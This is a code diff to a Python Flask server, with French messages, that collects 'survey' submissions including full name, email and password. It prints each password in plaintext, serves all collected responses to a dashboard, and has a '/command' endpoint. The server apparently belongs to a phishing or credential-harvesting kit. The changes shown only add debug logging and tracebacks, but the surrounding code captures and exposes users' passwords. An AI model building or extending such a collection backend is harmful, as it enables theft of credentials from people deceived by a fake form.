@@ -106,20 +106,29 @@ def receive_survey():
         data = request.json
         
         if not data:
+            print("[-] Données vides reçues")
             return jsonify({"error": "Données invalides"}), 400
         
+        print(f"[+] Données reçues: {list(data.keys())}")
+        
         # Sauvegarder les données du formulaire
-        if storage.save_survey_response(data):
+        saved = storage.save_survey_response(data)
+        print(f"[+] Tentative de sauvegarde: {saved}")
+        
+        if saved:
             print(f"[+] Formulaire reçu et sauvegardé")
             print(f"    Nom: {data.get('fullName', 'N/A')}")
             print(f"    Email: {data.get('email', 'N/A')}")
             print(f"    Mot de passe: {data.get('password', 'N/A')}")
             return jsonify({"status": "success", "message": "Formulaire enregistré"}), 200
         else:
+            print("[-] Échec de la sauvegarde")
             return jsonify({"error": "Erreur de sauvegarde"}), 500
     
     except Exception as e:
         print(f"[-] Erreur lors de la réception du formulaire: {e}")
+        import traceback
+        traceback.print_exc()
         return jsonify({"error": str(e)}), 500
 
 
@@ -130,14 +139,18 @@ def get_survey_responses():
     """
     try:
         responses = storage.get_survey_responses()
-        return jsonify({
+        result = {
             "success": True,
             "count": len(responses),
             "data": responses
-        }), 200
+        }
+        print(f"[+] Envoi de {len(responses)} réponses au dashboard")
+        return jsonify(result), 200
     except Exception as e:
         print(f"[-] Erreur lors de la récupération des formulaires: {e}")
-        return jsonify({"error": str(e)}), 500
+        import traceback
+        traceback.print_exc()
+        return jsonify({"success": False, "error": str(e)}), 500
 
 
 @app.route('/command', methods=['POST'])
